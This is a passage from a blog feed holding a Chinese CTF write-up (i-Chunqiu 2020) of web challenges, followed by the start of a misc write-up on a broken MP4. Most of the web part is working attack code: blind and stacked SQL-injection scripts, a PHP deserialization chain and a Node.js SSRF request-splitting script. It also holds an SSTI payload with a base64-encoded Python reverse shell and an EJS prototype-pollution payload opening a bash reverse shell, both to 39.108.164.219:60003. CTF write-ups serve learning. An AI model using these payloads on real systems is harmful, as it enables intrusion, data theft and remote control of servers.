        <content type="html"><![CDATA[<h1 id="iæ˜¥ç§‹"><a href="#iæ˜¥ç§‹" class="headerlink" title="iæ˜¥ç§‹"></a>iæ˜¥ç§‹</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"><a href="#ç®€å•çš„æ‹›è˜ç³»ç»Ÿ" class="headerlink" title="ç®€å•çš„æ‹›è˜ç³»ç»Ÿ"></a>ç®€å•çš„æ‹›è˜ç³»ç»Ÿ</h3><p>sqlmapç›´æ¥å‡ºæ¥</p><p>flag{2f52809e-f46c-4638-8f72-b24ec1ec6d06}</p><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>è¿‡æ»¤<code>union,&lt;,&gt;,=</code></p><p>æ„é€ <code>http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1 and if(hex(substr(fl4g,1,1))-1,sleep(5),0)</code></p><pre><code class="python">import requests&#39;http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1%20and%20if(hex(substr(fl4g,POS,1))-GUESS,sleep(5),0)&#39;result=&quot;666c61677b32363837656433302d356266382d343033662d383732342d61643239&quot;l=len(result)while True:    ended=True    l+=1    for i in range(16):        sql=&#39;http://ecd3dce145d342fd9d490cde15ef8239b1e8b5763640437a.changame.ichunqiu.com/?id=0%2bif(conv(substr(hex(fl4g),POS,1),16,10)-GUESS,1,sleep(5))&#39;        sql=sql.replace(&quot;POS&quot;,str(l))        sql=sql.replace(&quot;GUESS&quot;,str(i))        try:            requests.get(sql,timeout=5)            print(sql)        except :            result+=hex(i)[2:]            print(result)            ended=False            break    if ended:        break</code></pre><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>é»‘åå•:<code>union.*select,or,in</code></p><p>å› ä¸ºç›²æ³¨å¤ªéº»çƒ¦,æ‰€ä»¥æƒ³ç”¨pregå›æº¯æ¬¡æ•°æ¥ç»•è¿‡,ä½†æ˜¯æ²¡ç”¨,æœ€åä¹Ÿåªèƒ½ç›²æ³¨äº†</p><p>ç”¨<code>0 ^ (1=0)</code>æ¥ç›²æ³¨,å› ä¸ºè¿‡æ»¤äº†<code>in</code>æ‰€ä»¥ç”¨sysç³»ç»Ÿåº“æ¥ç»•è¿‡(<code>https://xz.aliyun.com/t/7169#toc-53</code>)</p><p><code>0 ^ (select substr(hex(group_concat(table_name)),1,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)</code></p><p>è·å–è¡¨åä¹‹å,è¿˜æœ‰ä¸€ä¸ªéš¾ç‚¹å°±æ˜¯,åˆ—åçš„è·å–,ä½†æ˜¯è·å–åˆ—åä¼šç”¨åˆ°<code>in</code>å­—ç¬¦</p><p>å› æ­¤è€ƒè™‘,æ— åˆ—åæ³¨å…¥<code>union select</code>é‚£ä¸ªè‚¯å®šä¸è¡Œ</p><p>æˆ‘ä»¬åˆ©ç”¨<code>((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>æ¥è·å–flag</p><p>å½“æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ—¶,æˆ‘ä»¬å¿…é¡»ä¿è¯æŸä¸€ä¸ªç›¸ç­‰,æ‰èƒ½é€šè¿‡å¦å¤–ä¸€ä¸ªåˆ¤æ–­flag</p><p>æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯</p><pre><code>mysql&gt; select &#39;f&#39;=&#39;F&#39;;+---------+| &#39;f&#39;=&#39;F&#39; |+---------+|       1 |+---------+</code></pre><p>ç”¨è¿™ç§æ–¹æ³•æ˜¯æ— æ³•åŒºåˆ†å¤§å°å†™çš„,æ‰€å¹¸è¿™æ¬¡æ¯”èµ›çš„flagéƒ½æ˜¯å°å†™</p><p>è„šæœ¬</p><pre><code class="python">import requestsimport stringsql=&quot;1 ^ ((select substr(hex(group_concat(table_name)),POS,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)=GUESS)&quot;#f1ag_1s_h3r3_hhhhh,users233333333333333result=&quot;&quot;# l=len(result)# while True:#     l+=1#     ended=True#     for i in string.printable:#         sql=&quot;1 ^ ((select 0,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;#         sql=sql.replace(&quot;POS&quot;,str(l))#         sql=sql.replace(&quot;GUESS&quot;,(result+i).encode(&quot;hex&quot;).upper())#         res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})#         print(sql)#         if &quot;Hello Nu1L&quot; in res.text:#             result+=i#             print(result)#             ended=False#             break#     if ended:#         break#FLAG{9AD0BB6D-634F-4AEC-9DD8-B617774CD334}l=len(result)while True:    l+=1    ended=True    for j in range(32,128):        i=chr(j)        sql=&quot;0 ^ ((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;        sql=sql.replace(&quot;POS&quot;,str(l))        sql=sql.replace(&quot;GUESS&quot;,&#39;0x&#39;+(result+i).encode(&quot;hex&quot;).upper())        res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})        print(sql)        if &quot;Hello Nu1L&quot; in res.text:            result+=chr(ord(i)-1)            print(result)            ended=False            break    if ended:        break</code></pre><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code>class info:__call public function __call($name,$argument){//ååºåˆ—åŒ–        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    }</code></pre><p>flagåœ¨flag.phpä¸­</p><p>æ–‡ä»¶è¯»å–ç‚¹:</p><pre><code class="php">class Userpublic function __destruct(){//ä»»æ„è¯»        return file_get_contents($this-&gt;nickname);//å±    }</code></pre><pre><code class="php">if($_SESSION[&#39;login&#39;]===1){    require_once(&quot;flag.php&quot;);    echo $flag;}</code></pre><p>ç°åœ¨æœ‰ä¸¤ç§æ€è·¯:</p><ol><li>ååºåˆ—åŒ–è¯»å–æ–‡ä»¶</li><li>sqlæ³¨å…¥æ‹¿åˆ°ç®¡ç†åŸå¯†ç ,æ¥è¯»å–æ–‡ä»¶(x)</li></ol><p>æ— è®ºæƒ³å¹²å•¥éƒ½å¾—å…ˆç™»é™†,ä½†æ˜¯ä¸çŸ¥é“å’‹ç™»é™†</p><p>è€ƒè™‘ååºåˆ—åŒ–</p><p>å¦‚æœæˆ‘ä»¬æˆåŠŸç™»é™†,æ”»å‡»å…¥å£å°±æ˜¯update.php</p><pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){    echo &quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;;}$users=new User();$users-&gt;update();if($_SESSION[&#39;login&#39;]===1){    require_once(&quot;flag.php&quot;);    echo $flag;}</code></pre><p>æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯,æŒ‰æˆ‘æ‰€çŸ¥,æƒ³è¦ååºåˆ—åŒ–å°±è¦ç™»é™†,ç™»é™†çš„è¯ä»–ä»¬å°±è‡ªå·±æ‰“å‡ºflagäº†,æ‰€ä»¥æ²¡æœ‰ååºåˆ—åŒ–çš„å¿…è¦?</p><p>è®¤çœŸçœ‹ä¸‹å¥½åƒæ²¡æœ‰die</p><pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){    echo &quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;;}</code></pre><p>ååºåˆ—åŒ–çš„èµ·ç‚¹æ˜¯:<code>$Info=unserialize($this-&gt;getNewinfo());</code></p><p>ç»ˆç‚¹æ˜¯:</p><pre><code class="php">class userpublic function __destruct(){//ä»»æ„è¯»        return file_get_contents($this-&gt;nickname);//å±    }</code></pre><p>æˆ–</p><pre><code class="php">class Infopublic function __call($name,$argument){//ååºåˆ—åŒ–        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    }</code></pre><p>å› ä¸º<code>__destruct</code>çš„æ•°æ®ä¸çŸ¥é“æ€ä¹ˆæ‹¿å‡ºæ¥,æˆ‘å…ˆè€ƒè™‘sqlæ³¨å…¥</p><p>å¦‚æœ,è€è€å®å®è®©ä»–ä»¬åºåˆ—åŒ–<code>Info</code>,å¥½åƒå•¥éƒ½å¹²ä¸äº†</p><p>æƒ³åŠæ³•åˆ©ç”¨<code>safe</code>å‡½æ•°åœ¨<code>Info</code>é‡Œé¢æ’ä¸ªç±»,æ’ä¸ª<code>UpdateHelper</code>ç„¶ååˆ©ç”¨å…¶<code>__destruct</code>æ–¹æ³•è°ƒç”¨<code>User</code>çš„<code>__toString</code>å‡½æ•°,</p><p>å†è°ƒç”¨<code>login</code>æ–¹æ³•,æœ€åæ‰§è¡Œsqlè¯­å¥</p><pre><code class="php">function safe($parm){    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#39;hacker&#39;,$parm);}class User{    public function update(){        $Info=unserialize($this-&gt;getNewinfo());        $age=$Info-&gt;age;        $nickname=$Info-&gt;nickname;        $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#39;id&#39;]);        //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘    }    public function getNewInfo(){            $age=$_POST[&#39;age&#39;];            $nickname=$_POST[&#39;nickname&#39;];            return safe(serialize(new Info($age,$nickname)));        }    public function __destruct(){//ä»»æ„è¯»            return file_get_contents($this-&gt;nickname);//å±        }    public function __toString()    {        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    }}</code></pre><pre><code class="php">Class UpdateHelper{    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo,$sql){        $newInfo=unserialize($newInfo);        $upDate=new dbCtrl();    }    public function __destruct()    {        echo $this-&gt;sql;    }}</code></pre><p>è„šæœ¬:</p><pre><code class="php">&lt;?phpClass UpdateHelper{    public $id=0;    public $newinfo=&quot;&quot;;    public $sql;    public function __construct($sql){        $this-&gt;sql=$sql;    }//    public function __destruct()//    {//        echo $this-&gt;sql;//    }}class Info{    public $age=&quot;&quot;;    public $nickname=&quot;&quot;;    public $CtrlCase;    public function __construct(){        $this-&gt;CtrlCase=new dbCtrl();    }//    public function __call($name,$argument){//ååºåˆ—åŒ–//        echo $this-&gt;CtrlCase-&gt;login($argument[0]);//    }}class dbCtrl{    public $hostname = &quot;127.0.0.1&quot;;    public $dbuser = &quot;noob123&quot;;    public $dbpass = &quot;noob123&quot;;    public $database = &quot;noob123&quot;;//    public $hostname = &quot;127.0.0.1&quot;;//    public $dbuser = &quot;root&quot;;//    public $dbpass = &quot;123456&quot;;//    public $database = &quot;test&quot;;    public $name=&quot;admin&quot;;    public $password=&quot;1&quot;;    public $mysqli;    public $token;}class User{    public $id=0;    public $age;    public $nickname;    public function __construct()    {        $this-&gt;nickname=new Info();        $this-&gt;age=&#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#39;;    }}function escape($str){    $evil=&#39;&#39;;    $len=strlen($str)+2;    if($len%2)    {        $evil.=&quot;union&quot;;        $len-=1;    }    $len/=2;    while($len)    {        $evil.=&quot;load&quot;;        $len-=1;    }    return $evil.&#39;&quot;;&#39;.$str;}$call__tostring=new UpdateHelper(new User());$ser= urlencode(serialize($call__tostring));echo urlencode(escape(&quot;s:8:\&quot;CtrlCase\&quot;;&quot;.urldecode($ser).&#39;;};&#39;));</code></pre><p><code>flag{7989f259-3281-4c1c-8939-dc8bc0b5375b}</code></p><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><pre><code class="php">&lt;?php     function check($str)    {        if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i&#39;,$str,$matches))        {            print_r($matches);            return 0;        }        else        {            return 1;        }    }    try    {        $db = new PDO(&#39;mysql:host=localhost;dbname=pdotest&#39;,&#39;root&#39;,&#39;******&#39;);    }     catch(Exception $e)    {        echo $e-&gt;getMessage();    }    if(isset($_GET[&#39;id&#39;]))    {        $id = $_GET[&#39;id&#39;];    }    else    {        $test = $db-&gt;query(&quot;select balabala from table1&quot;);        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);        $id = $res[&#39;balabala&#39;];    }    if(check($id))    {        $query = &quot;select balabala from table1 where 1=?&quot;;        $db-&gt;query(&quot;set names gbk&quot;);        $row = $db-&gt;prepare($query);        $row-&gt;bindParam(1,$id);        $row-&gt;execute();    }</code></pre><p>åˆ©ç”¨å®½å­—èŠ‚æ¥é€ƒå‡ºå¼•å·åŒ…å›´,payload:<code>%bf%27;</code></p><p>ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„sqlæ—¶é—´ç›²æ³¨è¯­å¥,æ­£åˆ™æ¥å»¶æ—¶ä¹Ÿæ²¡ç”¨,åŠ ä¸Šselectè¢«è¿‡æ»¤,</p><p>æˆ‘ç¼ºå°‘äº†ä¸€ä¸ªå…³é”®çš„çŸ¥è¯†</p><p>åœ¨å­¦é•¿çš„æç¤ºä¸‹,è¢«è®¤ä¸ºä¸å¯ä»¥å †å æ³¨å…¥çš„pdoå±…ç„¶å¯ä»¥(æˆ‘å“ªæ¥çš„è®¤çŸ¥????)</p><p>ç„¶åå°±ç®€å•äº†</p><pre><code>set @t=0x73656C65637420736C65657028313029;PREPARE sqla from @t;EXECUTE sqla;</code></pre><p>pythonè„šæœ¬</p><pre><code class="python">import requestsdef sql_inj(sql):    sql=&quot;0x&quot;+sql.encode(&quot;hex&quot;)    tpl=&quot;set @t=TGT;PREPARE sqla from @t;EXECUTE sqla;&quot;.replace(&quot;TGT&quot;,sql)    url=&quot;http://b0ae8f49254247b8815616a4711941f17f2a145a8a374167.changame.ichunqiu.com/&quot;    param={        &quot;id&quot;:&quot;\xbf\x27;&quot;+tpl    }    requests.get(url,params=param,timeout=2)#696E666F726D6174696F6E5F736368656D612C6D7973716C2C70646F746573742C706572666F726D616E63655F736368656D61#table1#balabala,eihey,fllllll4g,bbbresult=&quot;&quot;count=1+len(result)while True:    lock=0    for i in &quot;0123456789ABCDEF&quot;:        #UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#39;tablename&#39;        try :            sql=&quot;select if(substr(hex(group_concat(COL)),POS,1)=&#39;GUESS&#39;,sleep(3),0) from TABLE WHERE&quot;.replace(&quot;COL&quot;,&quot;fllllll4g&quot;)            sql=sql.replace(&quot;GUESS&quot;,i).replace(&quot;TABLE&quot;,&quot;table1&quot;)            sql=sql.replace(&quot;WHERE&quot;,&quot;&quot;)            sql=sql.replace(&quot;POS&quot;,str(count))            sql_inj(sql)            print(sql)        except :            result+=i            print(result)            lock=1            break    if not lock:        break    count+=1</code></pre><h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>è¿™é¢˜è®©æˆ‘å­¦åˆ°ä¸€ä¸ªéªšæ“ä½œå’Œçœ‹åˆ°ä¸€ç¯‡å¥½æ–‡ç« </p><pre><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>åˆ©ç”¨å †å æ³¨å…¥æŸ¥è¯¢</p><pre><code>array(1) {  [0]=&gt;  string(8) &quot;FlagHere&quot;}array(1) {  [0]=&gt;  string(5) &quot;words&quot;}</code></pre><pre><code>1&#39;;show create table words;#array(2) {  [0]=&gt;  string(5) &quot;words&quot;  [1]=&gt;  string(114) &quot;CREATE TABLE `words` (  `id` int(10) NOT NULL,  `data` varchar(20) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;}1&#39;;show create table FlagHere;#array(2) {  [0]=&gt;  string(8) &quot;FlagHere&quot;  [1]=&gt;  string(93) &quot;CREATE TABLE `FlagHere` (  `flag` varchar(100) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;}</code></pre><p>åˆ©ç”¨handleræ¥è¯»å–æ•°æ®</p><p><code>1&#39;;handler FlagHere open;handler FlagHere read first;#</code></p><h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p><code>2</code></p><p>è¿‡æ»¤<code>import,os</code></p><pre><code>{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')}}{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()}}{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()|attr('__dict__')}}{{config.__class__.__mro__[1].__subclasses__()[-2].__init__.__globals__['o'+'s'].__dict__['sys'+'tem']('echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjM5LjEwOC4xNjQuMjE5Iiw2MDAwMykpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p|base'+'64 -d | python')}}</code></pre><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p> <a href="https://github.com/nodejs/node/issues/13296" target="_blank" rel="noopener">https://github.com/nodejs/node/issues/13296</a> </p><p> <a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a> </p><p>è¿™é¢˜æœ‰ä¸ªuploadå‡½æ•°</p><pre><code class="javascript">app.post(&#39;/file_upload&#39;, function(req, res){    var ip = req.connection.remoteAddress;    var obj = {        msg: &#39;&#39;,    }    if (!ip.includes(&#39;127.0.0.1&#39;)) {        obj.msg=&quot;only admin&#39;s ip can use it&quot;        res.send(JSON.stringify(obj));        return     }    fs.readFile(req.files[0].path, function(err, data){        if(err){            obj.msg = &#39;upload failed&#39;;            res.send(JSON.stringify(obj));        }else{            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if(!fs.existsSync(__dirname + file_path)){                try {                    fs.mkdirSync(__dirname + file_path)                } catch (error) {                    obj.msg = &quot;file type error&quot;;                    res.send(JSON.stringify(obj));                    return                }            }            try {                fs.writeFileSync(dir_file,data)                obj = {                    msg: &#39;upload success&#39;,                    filename: file_path + file_name                }             } catch (error) {                obj.msg = &#39;upload failed&#39;;            }            res.send(JSON.stringify(obj));            }    })})</code></pre><p>ä½†æ˜¯éœ€è¦æœ¬åœ°è®¿é—®</p><p>æœ‰ä¸€ä¸ªssrfçš„ç‚¹:</p><pre><code class="javascript">app.get(&#39;/core&#39;, function(req, res) {    var q = req.query.q;    var resp = &quot;&quot;;    if (q) {        var url = &#39;http://localhost:8081/source?&#39; + q        var trigger = blacklist(url);        if (trigger === true) {            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);        } else {            try {                http.get(url, function(resp) {                    resp.setEncoding(&#39;utf8&#39;);                    resp.on(&#39;error&#39;, function(err) {                    if (err.code === &quot;ECONNRESET&quot;) {                     console.log(&quot;Timeout occurs&quot;);                     return;                    }                   });                    resp.on(&#39;data&#39;, function(chunk) {                        try {                         resps = chunk.toString();                         res.send(resps);                        }catch (e) {                           res.send(e.message);                        }                    }).on(&#39;error&#39;, (e) =&gt; {                         res.send(e.message);});                });            } catch (error) {                console.log(error);            }        }    } else {        res.send(&quot;search param &#39;q&#39; missing!&quot;);    }})</code></pre><p>æˆ‘ä»¬åˆ©ç”¨nodejs 8åŠä¹‹å‰çš„<code>utf-8</code>è½¬<code>latin1</code>çš„æ¼æ´æ¥è¿›è¡Œssrf</p><pre><code>&gt; http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output[ &#39;GET /ÄÄŠ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p>payload:</p><pre><code class="python">import hashlibfrom urllib.parse import quote, unquoteimport requestsimport socket                                                                                                          file=&#39;&#39;&#39;------WebKitFormBoundaryVneK8P7cpLasJSn8Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;Content-Type: ../templatedoctype htmlhtml  head  body    include ../../../../../../flag.txt------WebKitFormBoundaryVneK8P7cpLasJSn8--&#39;&#39;&#39;.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)body=&#39;&#39;&#39; HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: %dContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryVneK8P7cpLasJSn8Connection: keep-alive%sGET /core HTTP/1.1Host: xConnection: keep-alivex:&#39;&#39;&#39; %(len(file),file)body=body.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)uni = {     &#39;/&#39;: quote(&#39;\u012f&#39;.encode(&#39;utf-8&#39;)),    &#39; &#39;: quote(&#39;\u0120&#39;.encode(&#39;utf-8&#39;)),    &#39;\n&#39;: quote(&#39;\u010a&#39;.encode(&#39;utf-8&#39;)),    &#39;\r&#39;: quote(&#39;\u010d&#39;.encode(&#39;utf-8&#39;)),    &#39;&quot;&#39;: quote(&#39;\u0122&#39;.encode(&#39;utf-8&#39;)),    &quot;&#39;&quot;: quote(&#39;\u0127&#39;.encode(&#39;utf-8&#39;)),    &#39;!&#39;: quote(&#39;\u0121&#39;.encode(&#39;utf-8&#39;)),    &#39;o&#39;: quote(&#39;\u016f&#39;.encode(&#39;utf-8&#39;)),    &#39;e&#39;: quote(&#39;\u0165&#39;.encode(&#39;utf-8&#39;)),}print(uni)host=&quot;&quot;payload = &#39;%s&#39; % bodyfor c, encoded in uni.items():    payload = payload.replace(c, encoded)print(payload)requests.get(&quot;http://123.57.212.112:33321/core?q=&quot;+payload)</code></pre><p><code>flag{8ed05e41-c306-4f0f-a958-6759f66890e9}</code></p><h3 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h3><p><code>https://xz.aliyun.com/t/7184#toc-7</code></p><p><code>https://xz.aliyun.com/t/6113#toc-4</code></p><pre><code>router.post(&#39;/action&#39;, function (req, res) {  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)}   req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  });</code></pre><p>ç±»ä¼¼jsåŸå‹é“¾æ±¡æŸ“çš„ç‚¹</p><p>ä½†æ˜¯éœ€è¦<code>req.session.user.user==ADMIN</code></p><pre><code class="javascript">router.post(&#39;/login&#39;, function (req, res) {  if(req.body.Submit==&quot;register&quot;){   if(safeKeyword(req.body.userid)){    res.end(&quot;&lt;script&gt;alert(&#39;forbid word&#39;);history.go(-1);&lt;/script&gt;&quot;)    }    req.session.user={      &#39;user&#39;:req.body.userid.toUpperCase(),      &#39;passwd&#39;: req.body.pwd,      &#39;isLogin&#39;:false    }    res.redirect(&#39;/&#39;);   }  else if(req.body.Submit==&quot;login&quot;){    if(!req.session.user){res.end(&quot;&lt;script&gt;alert(&#39;register first&#39;);history.go(-1);&lt;/script&gt;&quot;)}    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){      req.session.user.isLogin=true;    }    else{      res.end(&quot;&lt;script&gt;alert(&#39;error passwd&#39;);history.go(-1);&lt;/script&gt;&quot;)    }  }  res.redirect(&#39;/&#39;); ;});function safeKeyword(keyword) {  if(keyword.match(/(admin)/is)) {      return keyword  }  return undefined}</code></pre><p>è°·æ­Œæ‰¾åˆ°<code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code>,å…³äº<code>toUpperCase</code>çš„ä¸€äº›ç‰¹æ€§,æ¥ç»•è¿‡<code>safeKeyword</code></p><p>payload:<code>userid=adm%C4%B1n&amp;pwd=a&amp;action=login&amp;Submit=register</code> | <code>admÄ±n</code></p><p>æœ€åæ±¡æŸ“<code>ejs</code>æ¥æ‹¿åˆ°flag(<code>https://xz.aliyun.com/t/6113#toc-4</code>)</p><pre><code>{&quot;Submit&quot;:&quot;&quot;,&quot;lud&quot;:1,&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;a; global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/39.108.164.219/60003 0&gt;&amp;1\&quot;&#39;);//&quot;}}</code></pre><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p><a href="http://www.zipä¸‹è½½æºç " target="_blank" rel="noopener">www.zipä¸‹è½½æºç </a></p><p>è¾“å…¥ä¸å­˜åœ¨çš„è·¯å¾„å‘ç°æ˜¯tp6.0.0,åˆšå¥½æœ‰ä¸ªsessionç›´æ¥å†™çš„æ¼æ´</p><p>å…¨å±€æœç´¢session,å‘ç°</p><pre><code class="php"> $record = session(&quot;Record&quot;);            if (!session(&quot;Record&quot;))            {                session(&quot;Record&quot;,$data[&quot;key&quot;]);            }</code></pre><p>ç„¶ågetshell</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/26/iæ˜¥ç§‹2020/">http://blog.ccreater.top/2020/02/26/iæ˜¥ç§‹2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> æ¯”èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸmisc</title>
      <link href="/2020/02/20/%E6%9F%90misc/"/>
      <url>/2020/02/20/%E6%9F%90misc/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸çŸ¥é“å“ªé‡Œçš„misc"><a href="#ä¸çŸ¥é“å“ªé‡Œçš„misc" class="headerlink" title="ä¸çŸ¥é“å“ªé‡Œçš„misc"></a>ä¸çŸ¥é“å“ªé‡Œçš„misc</h1><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…</p><p>é‡Œé¢æœ‰ä¸€ä¸ªåŠ å¯†çš„è§†é¢‘æ–‡ä»¶å’ŒæœªåŠ å¯†çš„å›¾ç‰‡</p><p><img src="https://i.loli.net/2020/02/19/ptInrs6axclk12u.png" alt="image105"></p><p>æƒ³ç€å›¾ç‰‡ä¼šä¸ä¼šæœ‰æç¤º,ç”¨hxdæ‰“å¼€å‘ç°æœ«å°¾æœç„¶æœ‰æç¤º</p><p>kobe code</p><p><img src="https://i.loli.net/2020/02/19/mVqDzgoHdyOWBnT.png" alt="image211"></p><p>å¾—åˆ°å¯†ç :<code>OAEBEYTKNRBANB</code>,æˆåŠŸæ‹¿åˆ°è§†é¢‘æ–‡ä»¶</p><p>ä½†æ˜¯æç¤ºæ–‡ä»¶æ— æ³•æ‰“å¼€,ç”¨binwalkå•¥çš„å¼„äº†ä¸€ä¼š,å‘ç°é‡Œé¢æ²¡æœ‰è—å•¥</p><p>äºæ˜¯æ¢äº†ä¸ªæ€è·¯,çŒœæµ‹è¿™é¢˜æ˜¯è¦è®©æˆ‘ä»¬ä¿®å¤mp4æ–‡ä»¶?å¤´å¤§</p><blockquote><p>ä¸€ä¸ªMP4æ–‡ä»¶é¦–å…ˆä¼šæœ‰ä¸”åªæœ‰ä¸€ä¸ªâ€œftypâ€ç±»å‹çš„boxï¼Œä½œä¸ºMP4æ ¼å¼çš„æ ‡å¿—å¹¶åŒ…å«å…³äºæ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼›ä¹‹åä¼šæœ‰ä¸”åªæœ‰ä¸€ä¸ªâ€œmoovâ€ç±»å‹çš„boxï¼ˆMovie Boxï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§container boxï¼Œå­boxåŒ…å«äº†åª’ä½“çš„metadataä¿¡æ¯ï¼›MP4æ–‡ä»¶çš„åª’ä½“æ•°æ®åŒ…å«åœ¨â€œmdatâ€ç±»å‹çš„boxï¼ˆMidia Data Boxï¼‰ä¸­ï¼Œè¯¥ç±»å‹çš„boxä¹Ÿæ˜¯container 